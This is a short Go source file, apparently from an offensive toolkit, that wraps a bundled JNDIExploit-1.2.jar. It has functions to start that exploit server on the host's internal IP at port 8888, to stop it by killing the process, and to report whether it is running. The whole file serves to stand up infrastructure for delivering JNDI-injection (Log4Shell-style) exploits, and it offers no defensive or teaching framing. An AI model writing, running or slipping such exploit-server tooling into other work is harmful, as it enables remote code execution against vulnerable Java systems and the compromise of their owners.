package functions

import (
	"os/exec"
)

var jndiCmd *exec.Cmd

func StartJNDIServer() (string, error) {
	jdnipath := "./dependencies/jndiexploit_1.2/JNDIExploit-1.2.jar"
	javapath := FindJava()
	intIP, err := GetIntIP()
	if err != nil {
		return "", err
	}
	cmd := exec.Command(javapath, "-jar", jdnipath, "-i", intIP.String(), "-p", "8888")
	err = cmd.Start()
	if err != nil {
		return "", err
	}
	jndiCmd = cmd
	return "JNDI server started on " + intIP.String() + ":8888", nil
}

func StopJNDIServer() string {
	if jndiCmd != nil && jndiCmd.Process != nil {
		err := jndiCmd.Process.Kill()
		if err != nil {
			return "Error stopping JNDI server: " + err.Error()
		}
		jndiCmd = nil // Clear the stored command
		return "JNDI server stopped"
	}
	return "JNDI server is not running"
}

func CheckJNDIServer() string {
	if jndiCmd != nil && jndiCmd.Process != nil {
		return "JNDI server is running"
	} else {
		return "JNDI server is not running"
	}
}
